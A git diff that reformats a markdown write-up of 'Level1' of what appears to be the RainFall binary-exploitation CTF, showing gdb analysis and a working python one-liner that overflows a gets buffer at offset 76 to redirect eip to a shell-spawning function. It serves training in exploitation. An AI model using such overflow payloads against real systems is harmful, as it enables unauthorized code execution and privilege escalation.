@@ -1,12 +1,12 @@
-# Level1
+# **Level1**
 
-## Analysis
+## **Analysis**
 
-**In `main` :**
+**In `main()` :**
 
 Just a `gets`
 
-We also have a `run` function defined but never used
+We also have a `run()` function defined but never used
 ```
 (gdb) info function
 ...
@@ -15,15 +15,15 @@ We also have a `run` function defined but never used
 ...
 ```
 
-**In `run` :**
+**In `run()` :**
 
 Open a shell with `level2` access
 
 ___
 
-## Exploit
+## **Exploit**
 
-We need to access `run` by overwritting `eip` using the unprotected `gets` and overflowing the buffer
+We need to access `run()` by overwritting `eip` using the unprotected `gets` and overflowing the buffer
 
 Getting eip offset using `offset.py`, which is `76`
 ```
@@ -41,7 +41,7 @@ Program received signal SIGSEGV, Segmentation fault.
 76
 ```
 
-Now, we can just replace `eip` with `run` adress
+Now, we can just replace `eip` with `run()` adress
 ```
 level1@RainFall:~$ python -c 'print "\x90" * 76 + "\x44\x84\x04\x08"' | ./level1
 Good... Wait what?
